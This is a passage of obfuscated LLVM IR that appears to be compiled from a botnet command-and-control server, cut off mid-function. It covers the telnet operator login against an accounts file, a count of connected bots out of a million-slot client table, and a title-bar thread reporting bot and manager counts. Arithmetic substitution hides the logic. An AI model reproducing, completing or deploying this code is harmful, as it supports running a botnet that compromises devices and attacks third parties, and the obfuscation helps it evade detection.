  call void @perror(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.219, i32 0, i32 0))
  store i32 -1, i32* %2, align 4
  br label %36

; <label>:35:                                     ; preds = %11
  store i32 0, i32* %2, align 4
  br label %36

; <label>:36:                                     ; preds = %35, %34, %10
  %37 = load i32, i32* %2, align 4
  ret i32 %37
}

; Function Attrs: nounwind
declare i32 @epoll_ctl(i32, i32, i32, %struct.epoll_event*) #3

declare i64 @send(i32, i8*, i64, i32) #1

; Function Attrs: nounwind readonly
declare i8* @strstr(i8*, i8*) #2

declare i32 @printf(i8*, ...) #1

declare i32 @fcntl(i32, i32, ...) #1

; Function Attrs: noinline nounwind uwtable
define i32 @clientsConnected() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  store i32 0, i32* %2, align 4
  store i32 0, i32* %1, align 4
  br label %3

; <label>:3:                                      ; preds = %20, %0
  %4 = load i32, i32* %1, align 4
  %5 = icmp slt i32 %4, 1000000
  br i1 %5, label %6, label %26

; <label>:6:                                      ; preds = %3
  %7 = load i32, i32* %1, align 4
  %8 = sext i32 %7 to i64
  %9 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %8
  %10 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %9, i32 0, i32 2
  %11 = load i8, i8* %10, align 1
  %12 = icmp ne i8 %11, 0
  br i1 %12, label %14, label %13

; <label>:13:                                     ; preds = %6
  br label %20

; <label>:14:                                     ; preds = %6
  %15 = load i32, i32* %2, align 4
  %16 = add i32 %15, -163453112
  %17 = add i32 %16, 1
  %18 = sub i32 %17, -163453112
  %19 = add nsw i32 %15, 1
  store i32 %18, i32* %2, align 4
  br label %20

; <label>:20:                                     ; preds = %14, %13
  %21 = load i32, i32* %1, align 4
  %22 = add i32 %21, 962311805
  %23 = add i32 %22, 1
  %24 = sub i32 %23, 962311805
  %25 = add nsw i32 %21, 1
  store i32 %24, i32* %1, align 4
  br label %3

; <label>:26:                                     ; preds = %3
  %27 = load i32, i32* %2, align 4
  ret i32 %27
}

; Function Attrs: noinline nounwind uwtable
define i8* @titleWriter(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca [2048 x i8], align 16
  store i8* %0, i8** %3, align 8
  %6 = load i8*, i8** %3, align 8
  %7 = ptrtoint i8* %6 to i32
  store i32 %7, i32* %4, align 4
  br label %8

; <label>:8:                                      ; preds = %21, %1
  %9 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %9, i8 0, i64 2048, i32 16, i1 false)
  %10 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i32 0, i32 0
  %11 = call i32 @clientsConnected()
  %12 = load volatile i32, i32* @managesConnected, align 4
  %13 = call i32 (i8*, i8*, ...) @sprintf(i8* %10, i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.8, i32 0, i32 0), i32 27, i32 %11, i32 %12, i32 7) #7
  %14 = load i32, i32* %4, align 4
  %15 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i32 0, i32 0
  %16 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i32 0, i32 0
  %17 = call i64 @strlen(i8* %16) #8
  %18 = call i64 @send(i32 %14, i8* %15, i64 %17, i32 16384)
  %19 = icmp eq i64 %18, -1
  br i1 %19, label %20, label %21

; <label>:20:                                     ; preds = %8
  br label %21

; <label>:21:                                     ; preds = %20, %8
  %22 = call i32 @sleep(i32 2)
  br label %8
                                                  ; No predecessors!
  %24 = load i8*, i8** %2, align 8
  ret i8* %24
}

; Function Attrs: nounwind
declare i32 @sprintf(i8*, i8*, ...) #3

declare i32 @sleep(i32) #1

; Function Attrs: noinline nounwind uwtable
define i32 @Search_in_File(i8*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca %struct._IO_FILE*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca [512 x i8], align 16
  store i8* %0, i8** %3, align 8
  store i32 0, i32* %5, align 4
  store i32 0, i32* %6, align 4
  store i32 0, i32* %7, align 4
  %9 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.9, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.10, i32 0, i32 0))
  store %struct._IO_FILE* %9, %struct._IO_FILE** %4, align 8
  %10 = icmp eq %struct._IO_FILE* %9, null
  br i1 %10, label %11, label %12

; <label>:11:                                     ; preds = %1
  store i32 -1, i32* %2, align 4
  br label %47

; <label>:12:                                     ; preds = %1
  br label %13

; <label>:13:                                     ; preds = %29, %12
  %14 = getelementptr inbounds [512 x i8], [512 x i8]* %8, i32 0, i32 0
  %15 = load %struct._IO_FILE*, %struct._IO_FILE** %4, align 8
  %16 = call i8* @fgets(i8* %14, i32 512, %struct._IO_FILE* %15)
  %17 = icmp ne i8* %16, null
  br i1 %17, label %18, label %35

; <label>:18:                                     ; preds = %13
  %19 = getelementptr inbounds [512 x i8], [512 x i8]* %8, i32 0, i32 0
  %20 = load i8*, i8** %3, align 8
  %21 = call i8* @strstr(i8* %19, i8* %20) #8
  %22 = icmp ne i8* %21, null
  br i1 %22, label %23, label %29

; <label>:23:                                     ; preds = %18
  %24 = load i32, i32* %6, align 4
  %25 = sub i32 0, 1
  %26 = sub i32 %24, %25
  %27 = add nsw i32 %24, 1
  store i32 %26, i32* %6, align 4
  %28 = load i32, i32* %5, align 4
  store i32 %28, i32* %7, align 4
  br label %29

; <label>:29:                                     ; preds = %23, %18
  %30 = load i32, i32* %5, align 4
  %31 = add i32 %30, -441721296
  %32 = add i32 %31, 1
  %33 = sub i32 %32, -441721296
  %34 = add nsw i32 %30, 1
  store i32 %33, i32* %5, align 4
  br label %13

; <label>:35:                                     ; preds = %13
  %36 = load %struct._IO_FILE*, %struct._IO_FILE** %4, align 8
  %37 = icmp ne %struct._IO_FILE* %36, null
  br i1 %37, label %38, label %41

; <label>:38:                                     ; preds = %35
  %39 = load %struct._IO_FILE*, %struct._IO_FILE** %4, align 8
  %40 = call i32 @fclose(%struct._IO_FILE* %39)
  br label %41

; <label>:41:                                     ; preds = %38, %35
  %42 = load i32, i32* %6, align 4
  %43 = icmp eq i32 %42, 0
  br i1 %43, label %44, label %45

; <label>:44:                                     ; preds = %41
  store i32 0, i32* %2, align 4
  br label %47

; <label>:45:                                     ; preds = %41
  %46 = load i32, i32* %7, align 4
  store i32 %46, i32* %2, align 4
  br label %47

; <label>:47:                                     ; preds = %45, %44, %11
  %48 = load i32, i32* %2, align 4
  ret i32 %48
}

declare %struct._IO_FILE* @fopen(i8*, i8*) #1

declare i8* @fgets(i8*, i32, %struct._IO_FILE*) #1

declare i32 @fclose(%struct._IO_FILE*) #1

; Function Attrs: noinline nounwind uwtable
define void @client_addr(i64, i64) #0 {
  %3 = alloca %struct.sockaddr_in, align 4
  %4 = alloca %struct._IO_FILE*, align 8
  %5 = bitcast %struct.sockaddr_in* %3 to { i64, i64 }*
  %6 = getelementptr inbounds { i64, i64 }, { i64, i64 }* %5, i32 0, i32 0
  store i64 %0, i64* %6, align 4
  %7 = getelementptr inbounds { i64, i64 }, { i64, i64 }* %5, i32 0, i32 1
  store i64 %1, i64* %7, align 4
  %8 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %9 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %8, i32 0, i32 0
  %10 = load i32, i32* %9, align 4
  %11 = xor i32 255, -1
  %12 = xor i32 %10, %11
  %13 = and i32 %12, %10
  %14 = and i32 %10, 255
  %15 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %16 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %15, i32 0, i32 0
  %17 = load i32, i32* %16, align 4
  %18 = xor i32 %17, -1
  %19 = xor i32 65280, -1
  %20 = xor i32 -552441118, -1
  %21 = or i32 %18, %19
  %22 = or i32 -552441118, %20
  %23 = xor i32 %21, -1
  %24 = and i32 %23, %22
  %25 = and i32 %17, 65280
  %26 = lshr i32 %24, 8
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %28 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %27, i32 0, i32 0
  %29 = load i32, i32* %28, align 4
  %30 = xor i32 16711680, -1
  %31 = xor i32 %29, %30
  %32 = and i32 %31, %29
  %33 = and i32 %29, 16711680
  %34 = lshr i32 %32, 16
  %35 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %36 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %35, i32 0, i32 0
  %37 = load i32, i32* %36, align 4
  %38 = xor i32 %37, -1
  %39 = xor i32 -16777216, -1
  %40 = xor i32 384439366, -1
  %41 = or i32 %38, %39
  %42 = or i32 384439366, %40
  %43 = xor i32 %41, -1
  %44 = and i32 %43, %42
  %45 = and i32 %37, -16777216
  %46 = lshr i32 %44, 24
  %47 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.11, i32 0, i32 0), i32 %13, i32 %26, i32 %34, i32 %46)
  %48 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.12, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.13, i32 0, i32 0))
  store %struct._IO_FILE* %48, %struct._IO_FILE** %4, align 8
  %49 = load %struct._IO_FILE*, %struct._IO_FILE** %4, align 8
  %50 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %51 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %50, i32 0, i32 0
  %52 = load i32, i32* %51, align 4
  %53 = xor i32 %52, -1
  %54 = xor i32 255, -1
  %55 = xor i32 -465330567, -1
  %56 = or i32 %53, %54
  %57 = or i32 -465330567, %55
  %58 = xor i32 %56, -1
  %59 = and i32 %58, %57
  %60 = and i32 %52, 255
  %61 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %62 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %61, i32 0, i32 0
  %63 = load i32, i32* %62, align 4
  %64 = xor i32 %63, -1
  %65 = xor i32 65280, -1
  %66 = xor i32 -444907511, -1
  %67 = or i32 %64, %65
  %68 = or i32 -444907511, %66
  %69 = xor i32 %67, -1
  %70 = and i32 %69, %68
  %71 = and i32 %63, 65280
  %72 = lshr i32 %70, 8
  %73 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %74 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %73, i32 0, i32 0
  %75 = load i32, i32* %74, align 4
  %76 = xor i32 16711680, -1
  %77 = xor i32 %75, %76
  %78 = and i32 %77, %75
  %79 = and i32 %75, 16711680
  %80 = lshr i32 %78, 16
  %81 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %82 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %81, i32 0, i32 0
  %83 = load i32, i32* %82, align 4
  %84 = xor i32 %83, -1
  %85 = xor i32 -16777216, -1
  %86 = xor i32 -1313466818, -1
  %87 = or i32 %84, %85
  %88 = or i32 -1313466818, %86
  %89 = xor i32 %87, -1
  %90 = and i32 %89, %88
  %91 = and i32 %83, -16777216
  %92 = lshr i32 %90, 24
  %93 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %49, i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.14, i32 0, i32 0), i32 %59, i32 %72, i32 %80, i32 %92)
  %94 = load %struct._IO_FILE*, %struct._IO_FILE** %4, align 8
  %95 = call i32 @fclose(%struct._IO_FILE* %94)
  ret void
}

declare i32 @fprintf(%struct._IO_FILE*, i8*, ...) #1

; Function Attrs: noinline nounwind uwtable
define i8* @telnetWorker(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i64, align 8
  %7 = alloca [2048 x i8], align 16
  %8 = alloca [2048 x i8], align 16
  %9 = alloca i8*, align 8
  %10 = alloca [80 x i8], align 16
  %11 = alloca i8*, align 8
  %12 = alloca i8*, align 8
  %13 = alloca [2048 x i8], align 16
  %14 = alloca %struct._IO_FILE*, align 8
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca [5000 x i8], align 16
  %19 = alloca [5000 x i8], align 16
  %20 = alloca [5000 x i8], align 16
  %21 = alloca [90000 x i8], align 16
  %22 = alloca [90000 x i8], align 16
  %23 = alloca [90000 x i8], align 16
  %24 = alloca [5000 x i8], align 16
  %25 = alloca [5000 x i8], align 16
  %26 = alloca [5000 x i8], align 16
  %27 = alloca [5000 x i8], align 16
  %28 = alloca [5000 x i8], align 16
  %29 = alloca [5000 x i8], align 16
  %30 = alloca [5000 x i8], align 16
  %31 = alloca [5000 x i8], align 16
  %32 = alloca [5000 x i8], align 16
  %33 = alloca [5000 x i8], align 16
  %34 = alloca [5000 x i8], align 16
  %35 = alloca [5000 x i8], align 16
  %36 = alloca [5000 x i8], align 16
  %37 = alloca [5000 x i8], align 16
  %38 = alloca [5000 x i8], align 16
  %39 = alloca [5000 x i8], align 16
  %40 = alloca [5000 x i8], align 16
  %41 = alloca [5000 x i8], align 16
  %42 = alloca [5000 x i8], align 16
  %43 = alloca [5000 x i8], align 16
  %44 = alloca [5000 x i8], align 16
  %45 = alloca [5000 x i8], align 16
  %46 = alloca [5000 x i8], align 16
  %47 = alloca [5000 x i8], align 16
  %48 = alloca [5000 x i8], align 16
  %49 = alloca [5000 x i8], align 16
  %50 = alloca [5000 x i8], align 16
  %51 = alloca [5000 x i8], align 16
  %52 = alloca [5000 x i8], align 16
  %53 = alloca [5000 x i8], align 16
  %54 = alloca [5000 x i8], align 16
  %55 = alloca [5000 x i8], align 16
  %56 = alloca [5000 x i8], align 16
  %57 = alloca [5000 x i8], align 16
  %58 = alloca [5000 x i8], align 16
  %59 = alloca [5000 x i8], align 16
  %60 = alloca [5000 x i8], align 16
  %61 = alloca [5000 x i8], align 16
  %62 = alloca [5000 x i8], align 16
  %63 = alloca [5000 x i8], align 16
  %64 = alloca [5000 x i8], align 16
  %65 = alloca [5000 x i8], align 16
  %66 = alloca [5000 x i8], align 16
  %67 = alloca [5000 x i8], align 16
  %68 = alloca [5000 x i8], align 16
  %69 = alloca [5000 x i8], align 16
  %70 = alloca [5000 x i8], align 16
  %71 = alloca [5000 x i8], align 16
  %72 = alloca [5000 x i8], align 16
  %73 = alloca [5000 x i8], align 16
  %74 = alloca [5000 x i8], align 16
  %75 = alloca [5000 x i8], align 16
  %76 = alloca [5000 x i8], align 16
  %77 = alloca [5000 x i8], align 16
  %78 = alloca [5000 x i8], align 16
  %79 = alloca [5000 x i8], align 16
  %80 = alloca [5000 x i8], align 16
  %81 = alloca [5000 x i8], align 16
  %82 = alloca [5000 x i8], align 16
  %83 = alloca [5000 x i8], align 16
  %84 = alloca [5000 x i8], align 16
  %85 = alloca [5000 x i8], align 16
  %86 = alloca [5000 x i8], align 16
  %87 = alloca [5000 x i8], align 16
  %88 = alloca [5000 x i8], align 16
  %89 = alloca [5000 x i8], align 16
  %90 = alloca [5000 x i8], align 16
  %91 = alloca [5000 x i8], align 16
  %92 = alloca [5000 x i8], align 16
  %93 = alloca [5000 x i8], align 16
  %94 = alloca [5000 x i8], align 16
  %95 = alloca [5000 x i8], align 16
  %96 = alloca [5000 x i8], align 16
  %97 = alloca [5000 x i8], align 16
  %98 = alloca %struct._IO_FILE*, align 8
  %99 = alloca %struct._IO_FILE*, align 8
  %100 = alloca %struct._IO_FILE*, align 8
  %101 = alloca [100 x i8*], align 16
  %102 = alloca i8*, align 8
  %103 = alloca i8*, align 8
  %104 = alloca i8*, align 8
  %105 = alloca i8*, align 8
  %106 = alloca [50 x i8*], align 16
  %107 = alloca [100 x i8*], align 16
  %108 = alloca [100 x i8*], align 16
  %109 = alloca [100 x i8*], align 16
  %110 = alloca [50 x i8*], align 16
  %111 = alloca %struct._IO_FILE*, align 8
  store i8* %0, i8** %3, align 8
  %112 = load i8*, i8** %3, align 8
  %113 = ptrtoint i8* %112 to i32
  store i32 %113, i32* %4, align 4
  %114 = load volatile i32, i32* @managesConnected, align 4
  %115 = sub i32 0, 1
  %116 = sub i32 %114, %115
  %117 = add nsw i32 %114, 1
  store volatile i32 %116, i32* @managesConnected, align 4
  %118 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %118, i8 0, i64 2048, i32 16, i1 false)
  store i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.15, i32 0, i32 0), i8** %12, align 8
  %119 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %119, i8 0, i64 2048, i32 16, i1 false)
  %120 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %120, i8 0, i64 2048, i32 16, i1 false)
  store i32 0, i32* %15, align 4
  %121 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.9, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.10, i32 0, i32 0))
  store %struct._IO_FILE* %121, %struct._IO_FILE** %14, align 8
  br label %122

; <label>:122:                                    ; preds = %132, %1
  %123 = load %struct._IO_FILE*, %struct._IO_FILE** %14, align 8
  %124 = call i32 @feof(%struct._IO_FILE* %123) #7
  %125 = icmp ne i32 %124, 0
  %126 = xor i1 %125, true
  %127 = and i1 true, %126
  %128 = xor i1 true, true
  %129 = and i1 %125, %128
  %130 = or i1 %127, %129
  %131 = xor i1 %125, true
  br i1 %130, label %132, label %139

; <label>:132:                                    ; preds = %122
  %133 = load %struct._IO_FILE*, %struct._IO_FILE** %14, align 8
  %134 = call i32 @fgetc(%struct._IO_FILE* %133)
  store i32 %134, i32* %16, align 4
  %135 = load i32, i32* %15, align 4
  %136 = sub i32 0, 1
  %137 = sub i32 %135, %136
  %138 = add nsw i32 %135, 1
  store i32 %137, i32* %15, align 4
  br label %122

; <label>:139:                                    ; preds = %122
  store i32 0, i32* %17, align 4
  %140 = load %struct._IO_FILE*, %struct._IO_FILE** %14, align 8
  call void @rewind(%struct._IO_FILE* %140)
  br label %141

; <label>:141:                                    ; preds = %148, %139
  %142 = load i32, i32* %17, align 4
  %143 = load i32, i32* %15, align 4
  %144 = sub i32 0, 1
  %145 = add i32 %143, %144
  %146 = sub nsw i32 %143, 1
  %147 = icmp ne i32 %142, %145
  br i1 %147, label %148, label %171

; <label>:148:                                    ; preds = %141
  %149 = load %struct._IO_FILE*, %struct._IO_FILE** %14, align 8
  %150 = load i32, i32* %17, align 4
  %151 = sext i32 %150 to i64
  %152 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %151
  %153 = getelementptr inbounds %struct.account, %struct.account* %152, i32 0, i32 0
  %154 = getelementptr inbounds [20 x i8], [20 x i8]* %153, i32 0, i32 0
  %155 = load i32, i32* %17, align 4
  %156 = sext i32 %155 to i64
  %157 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %156
  %158 = getelementptr inbounds %struct.account, %struct.account* %157, i32 0, i32 1
  %159 = getelementptr inbounds [20 x i8], [20 x i8]* %158, i32 0, i32 0
  %160 = load i32, i32* %17, align 4
  %161 = sext i32 %160 to i64
  %162 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %161
  %163 = getelementptr inbounds %struct.account, %struct.account* %162, i32 0, i32 2
  %164 = getelementptr inbounds [20 x i8], [20 x i8]* %163, i32 0, i32 0
  %165 = call i32 (%struct._IO_FILE*, i8*, ...) @__isoc99_fscanf(%struct._IO_FILE* %149, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.16, i32 0, i32 0), i8* %154, i8* %159, i8* %164)
  %166 = load i32, i32* %17, align 4
  %167 = add i32 %166, -1818205029
  %168 = add i32 %167, 1
  %169 = sub i32 %168, -1818205029
  %170 = add nsw i32 %166, 1
  store i32 %169, i32* %17, align 4
  br label %141

; <label>:171:                                    ; preds = %141
  %172 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %173 = call i32 (i8*, i8*, ...) @sprintf(i8* %172, i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.17, i32 0, i32 0)) #7
  %174 = load i32, i32* %4, align 4
  %175 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %176 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %177 = call i64 @strlen(i8* %176) #8
  %178 = call i64 @send(i32 %174, i8* %175, i64 %177, i32 16384)
  %179 = icmp eq i64 %178, -1
  br i1 %179, label %180, label %181

; <label>:180:                                    ; preds = %171
  br label %2115

; <label>:181:                                    ; preds = %171
  %182 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %183 = call i32 (i8*, i8*, ...) @sprintf(i8* %182, i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.18, i32 0, i32 0)) #7
  %184 = load i32, i32* %4, align 4
  %185 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %186 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %187 = call i64 @strlen(i8* %186) #8
  %188 = call i64 @send(i32 %184, i8* %185, i64 %187, i32 16384)
  %189 = icmp eq i64 %188, -1
  br i1 %189, label %190, label %191

; <label>:190:                                    ; preds = %181
  br label %2115

; <label>:191:                                    ; preds = %181
  %192 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %193 = load i32, i32* %4, align 4
  %194 = call i32 @fdgets(i8* %192, i32 2048, i32 %193)
  %195 = icmp slt i32 %194, 1
  br i1 %195, label %196, label %197

; <label>:196:                                    ; preds = %191
  br label %2115

; <label>:197:                                    ; preds = %191
  %198 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  call void @trim(i8* %198)
  %199 = getelementptr inbounds [80 x i8], [80 x i8]* %10, i32 0, i32 0
  %200 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %201 = call i32 (i8*, i8*, ...) @sprintf(i8* %199, i8* %200) #7
  %202 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  store i8* %202, i8** %9, align 8
  %203 = load i8*, i8** %9, align 8
  %204 = call i32 @Search_in_File(i8* %203)
  store i32 %204, i32* %5, align 4
  %205 = load i8*, i8** %9, align 8
  %206 = load i32, i32* %5, align 4
  %207 = sext i32 %206 to i64
  %208 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %207
  %209 = getelementptr inbounds %struct.account, %struct.account* %208, i32 0, i32 0
  %210 = getelementptr inbounds [20 x i8], [20 x i8]* %209, i32 0, i32 0
  %211 = call i32 @strcmp(i8* %205, i8* %210) #8
  %212 = icmp eq i32 %211, 0
  br i1 %212, label %213, label %242

; <label>:213:                                    ; preds = %197
  %214 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %215 = call i32 (i8*, i8*, ...) @sprintf(i8* %214, i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.20, i32 0, i32 0)) #7
  %216 = load i32, i32* %4, align 4
  %217 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %218 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %219 = call i64 @strlen(i8* %218) #8
  %220 = call i64 @send(i32 %216, i8* %217, i64 %219, i32 16384)
  %221 = icmp eq i64 %220, -1
  br i1 %221, label %222, label %223

; <label>:222:                                    ; preds = %213
  br label %2115

; <label>:223:                                    ; preds = %213
  %224 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %225 = load i32, i32* %4, align 4
  %226 = call i32 @fdgets(i8* %224, i32 2048, i32 %225)
  %227 = icmp slt i32 %226, 1
  br i1 %227, label %228, label %229

; <label>:228:                                    ; preds = %223
  br label %2115

; <label>:229:                                    ; preds = %223
  %230 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  call void @trim(i8* %230)
  %231 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %232 = load i32, i32* %5, align 4
  %233 = sext i32 %232 to i64
  %234 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %233
  %235 = getelementptr inbounds %struct.account, %struct.account* %234, i32 0, i32 1
  %236 = getelementptr inbounds [20 x i8], [20 x i8]* %235, i32 0, i32 0
  %237 = call i32 @strcmp(i8* %231, i8* %236) #8
  %238 = icmp ne i32 %237, 0
  br i1 %238, label %239, label %240

; <label>:239:                                    ; preds = %229
  br label %243

; <label>:240:                                    ; preds = %229
  %241 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %241, i8 0, i64 2048, i32 16, i1 false)
  br label %279

; <label>:242:                                    ; preds = %197
  br label %243

; <label>:243:                                    ; preds = %242, %239
  %244 = load i8*, i8** %3, align 8
  %245 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @titleWriter, i8* %244) #7
  %246 = getelementptr inbounds [5000 x i8], [5000 x i8]* %20, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %246, i8 0, i64 2048, i32 16, i1 false)
  %247 = getelementptr inbounds [5000 x i8], [5000 x i8]* %20, i32 0, i32 0
  %248 = call i32 (i8*, i8*, ...) @sprintf(i8* %247, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.21, i32 0, i32 0)) #7
  %249 = getelementptr inbounds [5000 x i8], [5000 x i8]* %18, i32 0, i32 0
  %250 = call i32 (i8*, i8*, ...) @sprintf(i8* %249, i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.22, i32 0, i32 0)) #7
  %251 = getelementptr inbounds [5000 x i8], [5000 x i8]* %19, i32 0, i32 0
  %252 = call i32 (i8*, i8*, ...) @sprintf(i8* %251, i8* getelementptr inbounds ([56 x i8], [56 x i8]* @.str.23, i32 0, i32 0)) #7
  %253 = call i32 @sleep(i32 1)
  %254 = load i32, i32* %4, align 4
  %255 = getelementptr inbounds [5000 x i8], [5000 x i8]* %20, i32 0, i32 0
  %256 = getelementptr inbounds [5000 x i8], [5000 x i8]* %20, i32 0, i32 0
  %257 = call i64 @strlen(i8* %256) #8
  %258 = call i64 @send(i32 %254, i8* %255, i64 %257, i32 16384)
  %259 = icmp eq i64 %258, -1
  br i1 %259, label %260, label %261

; <label>:260:                                    ; preds = %243
  br label %2115

; <label>:261:                                    ; preds = %243
  %262 = load i32, i32* %4, align 4
  %263 = getelementptr inbounds [5000 x i8], [5000 x i8]* %18, i32 0, i32 0
  %264 = getelementptr inbounds [5000 x i8], [5000 x i8]* %18, i32 0, i32 0
  %265 = call i64 @strlen(i8* %264) #8
  %266 = call i64 @send(i32 %262, i8* %263, i64 %265, i32 16384)
  %267 = icmp eq i64 %266, -1
  br i1 %267, label %268, label %269

; <label>:268:                                    ; preds = %261
  br label %2115

; <label>:269:                                    ; preds = %261
  %270 = load i32, i32* %4, align 4
  %271 = getelementptr inbounds [5000 x i8], [5000 x i8]* %19, i32 0, i32 0
  %272 = getelementptr inbounds [5000 x i8], [5000 x i8]* %19, i32 0, i32 0
  %273 = call i64 @strlen(i8* %272) #8
  %274 = call i64 @send(i32 %270, i8* %271, i64 %273, i32 16384)
  %275 = icmp eq i64 %274, -1
  br i1 %275, label %276, label %277

; <label>:276:                                    ; preds = %269
  br label %2115

; <label>:277:                                    ; preds = %269
  %278 = call i32 @sleep(i32 7)
  br label %2115

; <label>:279:                                    ; preds = %2058, %2053, %2048, %2043, %240
  %280 = load i8*, i8** %3, align 8
  %281 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @titleWriter, i8* %280) #7
  %282 = load i32, i32* %4, align 4
  %283 = call i64 @send(i32 %282, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.24, i32 0, i32 0), i64 14, i32 16384)
  %284 = icmp eq i64 %283, -1
  br i1 %284, label %285, label %286

; <label>:285:                                    ; preds = %279
  br label %2115

; <label>:286:                                    ; preds = %279
  %287 = load i32, i32* %4, align 4
  %288 = call i64 @send(i32 %287, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.25, i32 0, i32 0), i64 2, i32 16384)
  %289 = icmp eq i64 %288, -1
  br i1 %289, label %290, label %291

; <label>:290:                                    ; preds = %286
  br label %2115

; <label>:291:                                    ; preds = %286
  %292 = getelementptr inbounds [90000 x i8], [90000 x i8]* %21, i32 0, i32 0
  %293 = call i32 (i8*, i8*, ...) @sprintf(i8* %292, i8* getelementptr inbounds ([49 x i8], [49 x i8]* @.str.26, i32 0, i32 0)) #7
  %294 = getelementptr inbounds [90000 x i8], [90000 x i8]* %22, i32 0, i32 0
